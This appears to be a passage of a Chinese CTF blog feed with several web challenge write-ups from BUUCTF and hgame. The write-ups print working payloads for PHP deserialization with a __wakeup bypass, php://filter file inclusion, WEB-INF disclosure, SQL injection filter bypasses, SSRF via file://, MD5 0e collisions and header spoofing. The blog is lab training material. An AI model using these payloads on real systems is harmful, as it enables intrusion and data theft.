class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'http://cdnjs.cloudflare.com/ajax/libs/three.js/r70/three.min.js'</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'http://cdnjs.cloudflare.com/ajax/libs/gsap/1.16.1/TweenMax.min.js'</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/OrbitControls.js'</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/Cat.js'</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>  <span class="attr">src</span>=<span class="string">"index.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>接下来根据包含 查看class.php<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> $username = <span class="string">'nonono'</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> $password = <span class="string">'yesyes'</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username,$password)</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;username = $username;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;password = $password;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;username = <span class="string">'guest'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;"</span>;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"You name is: "</span>;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"You password is: "</span>;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">'admin'</span>) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">global</span> $flag;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> $flag;</span></span><br><span class="line"><span class="php">        &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!"</span>;</span></span><br><span class="line"><span class="php">            <span class="keyword">die</span>();</span></span><br><span class="line"></span><br><span class="line"><span class="php">            </span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>根据_destruct（）函数  得知this-&gt;password==100  this-&gt;username==admin时  输出flag</p>
<p>随意在后面添加上<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> Name(<span class="string">'admin'</span>,<span class="number">100</span>);</span><br><span class="line">$b=serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br></pre></td></tr></table></figure><br>启动本地PHP环境  访问一下新的class.php<br>得到<br><figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">O:</span><span class="number">4</span>:<span class="string">"Name"</span>:<span class="number">2</span>:&#123;<span class="string">s:</span><span class="number">14</span>:<span class="string">"Nameusername"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"admin"</span>;<span class="string">s:</span><span class="number">14</span>:<span class="string">"Namepassword"</span>;<span class="string">i:</span><span class="number">100</span>;&#125;Syc&#123;dog_dog_dog_dog&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里不会了 看了一下WP<br>知识点：<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">因为username和password都是私有变量，变量中的类名前后会有空白符，而复制的时候会丢失，所以加上加%<span class="number">00</span></span><br><span class="line"></span><br><span class="line">将Name后面的<span class="number">2</span>改为<span class="number">3</span> 是为了绕过__wakeup()  使其username不被覆盖</span><br></pre></td></tr></table></figure></p>
<p>最后的payload：<br><figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">?select=O:<span class="number">4</span>:<span class="string">"Name"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">14</span>:<span class="string">"%00Name%00username"</span>;<span class="string">s:</span><span class="number">5</span>:<span class="string">"admin"</span>;<span class="string">s:</span><span class="number">14</span>:<span class="string">"%00Name%00password"</span>;<span class="string">i:</span><span class="number">100</span>;&#125;</span><br></pre></td></tr></table></figure></p>
<p>得到flag</p>
<p>学完JAVA之后 总算对反序列化这玩意 有点概念了  题不算太难 但是挺有意思的  开始我的反序列化之旅</p>
<p>看了WP之后 得知还有用python提交的  更简便  等以后我会更新一下python脚本的方法</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-极客大挑战 2019 Secret</title>
    <url>/2020/02/04/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret/</url>
    <content><![CDATA[<h1 id="极客大挑战-2019-Secret"><a href="#极客大挑战-2019-Secret" class="headerlink" title="极客大挑战 2019 Secret"></a>极客大挑战 2019 Secret</h1><p>打开题目 发现小㊙  查看一下源码 得到文件<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">Archive_room</span>.</span></span>php</span><br></pre></td></tr></table></figure><br><img src="/img/BUUCTF/极客大挑战2019Secret/0.png" alt="avatar"><br>点击SECRET</p>
<p><img src="/img/BUUCTF/极客大挑战2019Secret/1.png" alt="avatar"><br>看来要用BP抓包了</p>
<p>通过抓包确实得到一个action.php的文件<br><img src="/img/BUUCTF/极客大挑战2019Secret/2.png" alt="avatar"></p>
<p>放到Reapter中 发包  得到文件secr3t.php </p>
<p>访问得到源码<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>secret<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">    error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php">    $file=$_GET[<span class="string">'file'</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">exit</span>();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">include</span>($file); </span></span><br><span class="line"><span class="php"><span class="comment">//flag放在了flag.php里</span></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>审计之后 构造payload:<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">secr3t.php?<span class="attribute">file</span>=flag.php</span><br></pre></td></tr></table></figure><br>发现不太行</p>
<p>使用伪协议读取<br><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure></p>
<p>得到base64  解码得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-RoarCTF2019 Easy Java</title>
    <url>/2020/02/03/BUUCTF-RoarCTF2019-Easy-Java/</url>
    <content><![CDATA[<h1 id="RoarCTF2019-Easy-Java"><a href="#RoarCTF2019-Easy-Java" class="headerlink" title="RoarCTF2019 Easy Java"></a>RoarCTF2019 Easy Java</h1><p>打开环境  根据题目提示是JAVA 点击help<br>得到java.io.FileNotFoundException:{help.docx}</p>
<p>还没做过这种题  看了一下WP</p>
<p>知识点：<br><figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">WEB-INF/web.xml泄露</span><br><span class="line"></span><br><span class="line">WEB-INF主要包含一下文件或目录:</span><br><span class="line">/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line"></span><br><span class="line">/WEB-INF/classes/：含了站点所有用的 <span class="class"><span class="keyword">class</span> 文件，包括 <span class="title">servlet</span> <span class="title">class</span> 和非<span class="title">servlet</span> <span class="title">class</span>，他们不能包含在 .<span class="title">jar</span>文件中</span></span><br><span class="line"></span><br><span class="line">/WEB-INF/<span class="class"><span class="keyword">lib</span>/：存放<span class="title">web</span>应用需要的各种<span class="title">JAR</span>文件，放置仅在这个应用中要求使用的<span class="title">jar</span>文件,如数据库驱动<span class="title">jar</span>文件</span></span><br><span class="line"></span><br><span class="line">/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</span><br><span class="line"></span><br><span class="line">/WEB-INF/database.properties：数据库配置文件</span><br><span class="line"></span><br><span class="line">漏洞检测以及利用方法：通过找到web.xml文件，推断<span class="class"><span class="keyword">class</span>文件的路径，最后直接<span class="title">class</span>文件，在通过反编译<span class="title">class</span>文件，得到网站源码</span></span><br></pre></td></tr></table></figure><br>用BP抓包  改为POST请求  得到报错<br><img src="/img/BUUCTF/EasyJava/0.png" alt="avatar"></p>
<p>payload:<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">filename</span>=WEB-INF/web.xml</span><br></pre></td></tr></table></figure><br><img src="/img/BUUCTF/EasyJava/1.png" alt="avatar"></p>
<p>读取FlagController.class</p>
<p>payload:<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">?filename=WEB-INF/classes/com/wm/ctf/<span class="module-access"><span class="module"><span class="identifier">FlagController</span>.</span></span><span class="keyword">class</span></span><br></pre></td></tr></table></figure><br><img src="/img/BUUCTF/EasyJava/2.png" alt="avatar"></p>
<p>得到base64  解码得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-极客大挑战 2019EasySQL 1</title>
    <url>/2020/02/01/BUUCTF-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL-1/</url>
    <content><![CDATA[<h1 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="极客大挑战 2019 EasySQL"></a>极客大挑战 2019 EasySQL</h1><p>打开题目之后 发现就是一个索然无味的登陆界面</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">输入   密码随意</span><br><span class="line"><span class="number">1</span>  回显</span><br><span class="line"><span class="number">1</span>' 出现报错信息 得知是用单引号保护变量</span><br><span class="line">由于后面还接着password  所以不能使用#等注释符  不然就不会成立</span><br></pre></td></tr></table></figure>
<p>所以直接使用万能密码:<br><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">admin</span><span class="string">'or'</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span>&amp;<span class="keyword">password</span>=<span class="keyword">admin</span><span class="string">'or'</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<p>得到flag</p>
<p>很基础的题  极客大挑战虽然没参加  但是感觉难度应该不是很高  强网杯自闭</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-Havefun</title>
    <url>/2020/02/01/BUUCTF-Havefun/</url>
    <content><![CDATA[<h1 id="Havefun"><a href="#Havefun" class="headerlink" title="Havefun"></a>Havefun</h1><p>这道题做出来的时候 让我一度认为作者是在搞我</p>
<p>查看源码<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cat</span>=<span class="variable">$_GET</span>[<span class="string">'cat'</span>];</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$cat</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$cat</span>==<span class="string">'dog'</span>)&#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">'Syc&#123;cat_cat_cat_cat&#125;'</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p>
<p> payload:<br> /?cat=dog</p>
<p> 得到flag</p>
<p> 八成是个签到题目</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>hgame-Cosmos的留言板-1</title>
    <url>/2020/01/27/hgame-Cosmos%E7%9A%84%E7%95%99%E8%A8%80%E6%9D%BF-1/</url>
    <content><![CDATA[<h1 id="Cosmos的留言板-1"><a href="#Cosmos的留言板-1" class="headerlink" title="Cosmos的留言板-1"></a>Cosmos的留言板-1</h1><p>打开环境 基本就可以知道是考SQL注入</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">输入</span><br><span class="line"><span class="number">1</span><span class="string">' 没有回显，可以知道使用单引号保护变量</span></span><br><span class="line"><span class="string">1'</span>#  没有回显</span><br><span class="line"><span class="number">1</span># 有回显 可以用来查看一下过滤情况</span><br><span class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span>#  得知<span class="keyword">select</span>被过滤了</span><br><span class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>table_schema<span class="comment">/**/</span><span class="built_in">table_name</span><span class="comment">/**/</span><span class="keyword">column</span><span class="comment">/**/</span>information_schema#  得知常规的<span class="keyword">SQL</span>注入都没有被过滤</span><br></pre></td></tr></table></figure>
<p>最后得知过滤掉了select和空格</p>
<p>这里有很多个方法 用/**/块注释代替空格<br>select的话可以用sel&lt;&gt;ect进行截断<br>或者大小写混写 SelecT</p>
<p>再构造payload:</p>
<pre><code>-1&#39;/**/or/**/&#39;1&#39;=&#39;1  回显正常
</code></pre><p>爆表：</p>
<pre><code>    -1&#39;/**/union/**/SelecT/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/having&#39;1&#39;=&#39;1
    得到表名 f1aggggggggggggg
</code></pre><p>爆字段：</p>
<pre><code>    -1&#39;/**/union/**/SelecT/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&#39;f1aggggggggggggg&#39;/**/having&#39;1&#39;=&#39;1
    得到字段名fl4444444g
</code></pre><p>查询：</p>
<pre><code>    -1&#39;/**/union/**/SelecT/**/fl4444444g/**/from/**/f1aggggggggggggg/**/having&#39;1&#39;=&#39;1
</code></pre><p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>hgame-cosmos的博客后台</title>
    <url>/2020/01/26/hgame-cosmos%E7%9A%84%E5%8D%9A%E5%AE%A2%E5%90%8E%E5%8F%B0/</url>
    <content><![CDATA[<h1 id="cosmos的博客后台"><a href="#cosmos的博客后台" class="headerlink" title="cosmos的博客后台"></a>cosmos的博客后台</h1><p>太艰难了 自己还是太菜了<br>首先打开环境 hint是flag在根目录下<br>所以尝试一下本地文件包含  但是发现Hacker get out!</p>
<p>再尝试一下用伪协议去读login.php<br><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">http://cosmos-<span class="keyword">admin</span>.hgame.day-day.<span class="keyword">work</span>/<span class="keyword">index</span>.php?action=php://<span class="keyword">filter</span>/<span class="keyword">read</span>=convert.base64-encode/resource=<span class="keyword">login</span>.php</span><br></pre></td></tr></table></figure><br>再用base64转义一下  得到源码<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="comment">//Only for debug</span></span><br><span class="line"><span class="keyword">if</span> (DEBUG_MODE)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>])) &#123;</span><br><span class="line">        $debug = $_GET[<span class="string">'debug'</span>];</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">"/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/"</span>, $debug)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"args error!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">"var_dump($$debug);"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: admin.php"</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($admin_password == md5($_POST[<span class="string">'password'</span>]) &amp;&amp; $_POST[<span class="string">'username'</span>] === $admin_username)&#123;</span><br><span class="line">            $_SESSION[<span class="string">'username'</span>] = $_POST[<span class="string">'username'</span>];</span><br><span class="line">            header(<span class="string">"Location: admin.php"</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"用户名或密码错误"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"zh-CN"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"X-UA-Compatible"</span> content=<span class="string">"IE=edge"</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1"</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">"description"</span> content=<span class="string">""</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">"author"</span> content=<span class="string">""</span>&gt;</span><br><span class="line">    &lt;title&gt;Cosmos的博客后台&lt;/title&gt;</span><br><span class="line">    &lt;link href=<span class="string">"static/signin.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line">    &lt;link href=<span class="string">"static/sticky-footer.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line">    &lt;link href=<span class="string">"https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class="container"&gt;</span><br><span class="line">    &lt;form class="form-signin" method="post" action="login.php"&gt;</span><br><span class="line">        &lt;h2 class="form-signin-heading"&gt;后台登陆&lt;/h2&gt;</span><br><span class="line">        &lt;input type="text" name="username" class="form-control" placeholder="用户名" required autofocus&gt;</span><br><span class="line">        &lt;input type="password" name="password" class="form-control" placeholder="密码" required&gt;</span><br><span class="line">        &lt;input class="btn btn-lg btn-primary btn-block" type="submit" value="Submit"&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;footer class="footer"&gt;</span><br><span class="line">	&lt;center&gt;</span><br><span class="line">	&lt;div class="container"&gt;</span><br><span class="line">        &lt;p class="text-muted"&gt;Created by Annevi&lt;/p&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">      &lt;/center&gt;</span><br><span class="line">&lt;/footer&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><br>关键代码：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Only for debug</span></span><br><span class="line"><span class="keyword">if</span> (DEBUG_MODE)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>])) &#123;</span><br><span class="line">        $debug = $_GET[<span class="string">'debug'</span>];</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">"/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/"</span>, $debug)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"args error!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">"var_dump($$debug);"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>构造payload：<br><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">http://cosmos-<span class="keyword">admin</span>.hgame.day-day.<span class="keyword">work</span>/<span class="keyword">login</span>.php?<span class="keyword">debug</span>=GLOBALS</span><br></pre></td></tr></table></figure><br>使用GLOBALS显示全局变量<br>得到账号：Cosmos!<br>密码由于采用了!== 又是md5 而且是0exxxxx格式  所以利用PHP中md5的漏洞<br><a href="https://blog.csdn.net/qq_19980431/article/details/83018232" target="_blank" rel="noopener">https://blog.csdn.net/qq_19980431/article/details/83018232</a></p>
<p>随便用一个：QNKCDZO<br>成功登录到后台之后</p>
<p>再利用伪协议读取一下admin.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert_img</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'img_url'</span>])) &#123;</span><br><span class="line">        $img_url = @$_POST[<span class="string">'img_url'</span>];</span><br><span class="line">        $url_array = parse_url($img_url);</span><br><span class="line">        <span class="keyword">if</span> (@$url_array[<span class="string">'host'</span>] !== <span class="string">"localhost"</span> &amp;&amp; $url_array[<span class="string">'host'</span>] !== <span class="string">"timgsa.baidu.com"</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;   </span><br><span class="line">        $c = curl_init();</span><br><span class="line">        curl_setopt($c, CURLOPT_URL, $img_url);</span><br><span class="line">        curl_setopt($c, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $res = curl_exec($c);</span><br><span class="line">        curl_close($c);</span><br><span class="line">        $avatar = base64_encode($res);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(filter_var($img_url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $avatar;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> base64_encode(file_get_contents(<span class="string">"static/logo.png"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关键代码 利用SSRF构造payload<br><figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line"><span class="keyword">file</span>:<span class="comment">//localhost/flag</span></span><br></pre></td></tr></table></figure><br>复制图片的地址 解码后面的base64</p>
<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>hgame-鸡尼泰玫</title>
    <url>/2020/01/26/hgame-%E9%B8%A1%E5%B0%BC%E6%B3%B0%E7%8E%AB/</url>
    <content><![CDATA[<h1 id="鸡尼泰玫"><a href="#鸡尼泰玫" class="headerlink" title="鸡尼泰玫"></a>鸡尼泰玫</h1><p>打开发现又黑我坤坤</p>
<p>发现是个游戏 开始游戏 随便玩玩用bp抓包<br><img src="/img/hgame/鸡你太美/0.png" alt="avatar"></p>
<p>直接改score</p>
<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>hgame-Code World</title>
    <url>/2020/01/26/hgame-Code-World/</url>
    <content><![CDATA[<h1 id="Code-World"><a href="#Code-World" class="headerlink" title="Code World"></a>Code World</h1><p>打开竟然是个403</p>
<p>用bp抓包<br>访问一下index.php<br><img src="/img/hgame/codeworld/0.png" alt="avatar"></p>
<p>发现405错误<br><a href="https://www.jianshu.com/p/dd7315428462" target="_blank" rel="noopener">https://www.jianshu.com/p/dd7315428462</a></p>
<p>所以更改为POST请求<br><img src="/img/hgame/codeworld/1.png" alt="avatar"></p>
<p>提示要求通过URL计算两个数相加为10</p>
<p>所以直接URL：<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">/?a=<span class="number">1</span>+<span class="number">9</span></span><br></pre></td></tr></table></figure><br>但是由于URL中+会被转译为空格 使用URL编码<br><figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">/?a=<span class="number">1</span><span class="symbol">%</span><span class="number">2b9</span></span><br></pre></td></tr></table></figure><br><img src="/img/hgame/codeworld/2.png" alt="avatar"></p>
<p>得到flag</p>
]]></content>
      <categories>
        <category>WP</category>
        <category>WEB</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>hgame-接 头 霸 王</title>
    <url>/2020/01/26/hgame-Cosmos-%E7%9A%84%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<h1 id="接-头-霸-王"><a href="#接-头-霸-王" class="headerlink" title="接 头 霸 王"></a>接 头 霸 王</h1><p>打开环境 根据题目的图片提示 应该是改header</p>
<p>bp抓包<br>再根据You need to come from <a href="https://vidar.club/" target="_blank" rel="noopener">https://vidar.club/</a>. </p>
<p>使用Referer<br><figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">Referer:</span><span class="string">https:</span><span class="comment">//vidar.club/</span></span><br></pre></td></tr></table></figure></p>
<p>又要求本地，使用X-Forwarded-For<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><br>又要求使用Cosmos浏览器，使用User-Agent<br><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">User</span>-Agent: Cosmos</span><br></pre></td></tr></table></figure></p>
<p>又要求POST，直接改请求</p>
<p>得到：The flag will be updated after 2077, please wait for it patiently.</p>
